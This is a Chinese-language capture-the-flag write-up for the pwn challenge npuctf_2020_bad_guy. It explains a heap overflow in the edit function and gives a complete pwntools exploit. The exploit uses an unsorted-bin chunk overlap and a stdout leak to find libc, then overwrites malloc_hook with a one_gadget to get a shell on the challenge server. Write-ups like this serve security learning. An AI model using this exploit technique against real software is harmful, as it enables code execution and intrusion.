# npuctf_2020_bad_guy

查看保护

```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

```c
int edit()
{
    __int64 v0; // rax
    unsigned __int64 v2; // [rsp+0h] [rbp-10h]
    __int64 nbytes; // [rsp+8h] [rbp-8h]

    if ( count <= 0 )
    {
        puts("Bad Guy!");
        exit(1);
    }
    --count;
    printf("Index :");
    v2 = read_num();
    printf("size: ");
    nbytes = read_num();
    if ( !heaparray[2 * v2 + 1] || v2 > 9 )
        return puts("Bad Guy!");
    printf("content: ");
    return read(0, heaparray[2 * v2 + 1], nbytes);
}
```

edit可以改size。

攻击思路：没有show函数，利用unstortedbin打stdout泄露出libc。接着打fd为malloc_hook - 0x23，改malloc_hook为one_gadget即可。

1. 肯定是需要unstortedbin的，所以我们可以这样构造，0x10 0x10 0x60，利用chunk0改chunk1size为0x91，这样的话chunk1和chunk2就被包住 了，在改chunk1 size的时候记得先释放一下chunk3
2. 释放chunk3的原因是因为分割unstortedbin的时候让unstortedbin的fd和bk刚好落在chunk3的fastbin的fd和bk上
3. 利用chunk3将堆块申请到stdout这里， 改write_base和flags输出libc。
4. 再利用上面很相似的手法将堆块申请到malloc_hook - 0x23这里，改成one_gadget就可以了

```python
from pwn import *

context(arch='amd64', os='linux')#log_level='debug')

file_name = './z1r0'


elf = ELF(file_name)

def dbg():
    gdb.attach(r)

menu = '>> '

def add(index, size, content):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index :', str(index))
    r.sendlineafter('size: ', str(size))
    r.sendafter('Content:', content)

def edit(index, size, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index :', str(index))
    r.sendlineafter('size: ', str(size))
    r.sendafter('content: ', content)

def delete(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index :', str(index))

def attack():
    add(0, 0x10, 'aaaa')
    add(1, 0x10, 'aaaa')
    add(2, 0x60, 'bbbb')
    add(3, 0x10, 'ccc')

    delete(2)

    p1 = p64(0) * 3 + p64(0x91)
    edit(0, len(p1), p1)

    delete(1)

    add(4, 0x10, 'aaa')

    p2 = p64(0) * 3 + p64(0x71) + b'\xdd\x25'
    edit(4, len(p2), p2)

    add(5, 0x60, 'aaaa')

    p3 = b'a' * 3 + p64(0) * 6 + p64(0xfbad1880) + p64(0) * 3 + b'\x00'

    add(6, 0x60, p3)


    libc = ELF('./libc-2.23.so')

    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 192 - libc.sym['_IO_2_1_stderr_']
    success('libc_base = ' + hex(libc_base))
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    success('malloc_hook = ' + hex(malloc_hook))

    one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    one_gadget = one[3] + libc_base

    add(7, 0x60, 'aaa')

    delete(7)

    p4 = p64(0) * 3 + p64(0x71) + p64(malloc_hook - 0x23)
    edit(4, len(p4), p4)

    add(8, 0x60, 'aaa')

    p5 = b'a' * 0x13 + p64(one_gadget)
    add(9, 0x60, p5)

    r.sendlineafter(">> ", "1")
    r.sendlineafter("Index :", str(10))
    r.sendlineafter("size: ", str(0x10))

    r.interactive()

while True:
    try:
        r = remote('node4.buuoj.cn', 27229)
        attack()
        break
    except:
        r.close()
        continue
```